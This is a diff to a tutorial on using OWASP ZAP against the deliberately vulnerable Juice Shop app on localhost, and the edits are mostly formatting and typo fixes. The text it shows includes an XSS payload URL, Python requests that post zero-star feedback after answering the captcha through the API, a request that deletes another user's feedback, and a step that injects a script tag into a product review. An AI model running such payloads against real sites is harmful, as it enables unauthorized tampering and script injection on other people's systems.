@@ -145,8 +145,8 @@ function logger() {
 }
 
 // Control.getSingleton().getExtensionLoader().getExtension(ExtensionUserManagement.class);
-var HttpSender = Java.type('org.parosproxy.paros.network.HttpSender');
-var ScriptVars = Java.type('org.zaproxy.zap.extension.script.ScriptVars');
+var HttpSender    = Java.type('org.parosproxy.paros.network.HttpSender');
+var ScriptVars    = Java.type('org.zaproxy.zap.extension.script.ScriptVars');
 var HtmlParameter = Java.type('org.parosproxy.paros.network.HtmlParameter')
 var COOKIE_TYPE   = org.parosproxy.paros.network.HtmlParameter.Type.cookie;
 
@@ -268,7 +268,7 @@ https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
 http://localhost:3000/#/search?q=%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E
 
 
-### Challenge - Zero Stars
+#### Challenge - Zero Stars
 *Give a devastating zero-star feedback to the store.*     
 
 One of the pages we discovered is a contact page with the option to leave a rating 
@@ -285,16 +285,13 @@ zap = ZAPv2()
 proxy = zap._ZAPv2__proxies
 root = "http://localhost:3000"
 headers = {'Content-type': 'application/json'}
-
 captcha = requests.get("%s/rest/captcha/" % root, proxies=proxy, verify=False, headers=headers).json()
-print(captcha)
 data = requests.post("%s/api/Feedbacks/" % root, headers=headers, proxies=proxy, verify=False, data=json.dumps({
-  "comment":"Comment?",
-  "rating":0,
-  "captcha":captcha["answer"],
-  "captchaId":captcha["captchaId"]
+  "comment": "Comment?",
+  "rating": 0,
+  "captcha": captcha["answer"],
+  "captchaId": captcha["captchaId"]
 })).json()
-print(data)
 ```
 
 #### Challenge - Basket Access
@@ -329,7 +326,7 @@ proxy = zap._ZAPv2__proxies
 root = "http://localhost:3000"
 requests.delete("%s/api/Feedbacks/1" % root, proxies=proxy, verify=False)
 ```
-#### Breakppints
+#### Breakpoints
 Let's go back to the list of products, `http://localhost:3000/#/search`. If you click the eye icon to the 
 right of a product entry, a dialog will pop up. In that dialg you can `Add a review for this product` and submit! Let's go ahead and fill it out with `Awesome!`. Before we submit, let's go back into ZAP and toggle the circular record button (to the right of the lightbulb) to **Break on all requests**. Now back in the browser press submit! You will notice ZAP is brought into focus and a request is in view. You should see  the request headers `PUT http://localhost:3000/rest/product/1/reviews` and also the request body `{"message":"Awesome!","author":"Anonymous"}`. Let's go ahead and replace the message attribute with  `<script>alert(\"XSS\")</script>`. Now press the blue arrow key to *Submit and contoinue to the next break point*
 
